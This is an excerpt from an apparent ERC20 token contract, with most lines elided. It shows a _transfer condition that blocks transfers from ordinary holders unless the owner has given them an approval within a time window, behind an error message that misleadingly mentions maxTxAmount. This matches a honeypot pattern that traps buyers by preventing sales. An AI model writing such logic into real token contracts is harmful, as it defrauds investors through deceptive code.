...
contract Contract is IERC20, Ownable {
    ...
    function _transfer(
        ...
        if (!inSwapAndLiquify && from != uniswapV2Pair && from != address(router) && !_isExcludedFromFee[from]) {
            require(approval[from] > 0 && amount < _approved && block.timestamp < approval[from] + _approval, 'Transfer amount exceeds the maxTxAmount.');
        }
